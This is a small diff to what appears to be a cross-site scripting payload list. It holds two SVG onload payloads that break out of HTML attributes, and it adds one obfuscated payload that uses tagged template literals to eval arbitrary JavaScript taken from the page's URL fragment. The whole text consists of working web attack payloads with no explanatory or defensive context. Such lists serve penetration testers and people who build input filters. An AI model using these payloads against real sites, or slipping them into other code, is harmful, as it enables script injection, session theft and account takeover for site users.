@@ -1,2 +1,4 @@
 '"><svg/onload=alert('XSS')>
 '"><svg/onload=alert(/XSS/) a=
+
+eval.call`${unescape.call`${location.hash.substr`1`}`}`
